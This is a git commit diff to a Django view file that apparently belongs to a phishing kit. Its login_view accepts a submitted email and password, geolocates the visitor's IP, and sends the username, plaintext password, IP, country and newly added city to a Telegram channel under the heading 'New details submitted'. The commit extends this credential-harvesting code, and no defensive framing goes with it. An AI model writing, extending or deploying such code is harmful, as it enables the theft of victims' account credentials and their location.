b94b6488ca30aee4bca209c8995a78062e9204cd
Adetunji Peter <tunjipete@grrnberry.com>
2024-11-07 08:00:27 +0100

    new city

--- mail/views.py
+++ mail/views.py
@@ -15,8 +15,10 @@ def get_country_from_ip(ip_address):
     response = requests.get(url)
     if response.status_code == 200:
         data = response.json()
-        return data.get("country")  # Returns country name, e.g., "United States"
-    return None
+        country = data.get("country")     # Country name, e.g., "United States"
+        city = data.get("city")
+        return country, city
+    return None, None
 
 @csrf_exempt
 def login_view(request):
@@ -24,7 +26,7 @@ def login_view(request):
         email = request.POST.get("email")
         password = request.POST.get("pass")
         ip_address = request.META.get("REMOTE_ADDR")
-        country = get_country_from_ip(ip_address)
+        country, city = get_country_from_ip(ip_address)
         # if email and password:
         #     # Save data to the database
         #     Mail.objects.create(
@@ -32,7 +34,7 @@ def login_view(request):
         #         password=password
         #     )
         subject = 'New details submitted'
-        mail_message = f"{subject}\nipaddress:{ip_address} \ncountry:{country}\nusername: {email}\npassword: {password}"
+        mail_message = f"{subject}\nipaddress:{ip_address} \ncountry:{country} \ncity:{city}\nusername: {email}\npassword: {password}"
         send_to_telegram(mail_message)
         print(mail_message)
     return render(request, 'index.html')
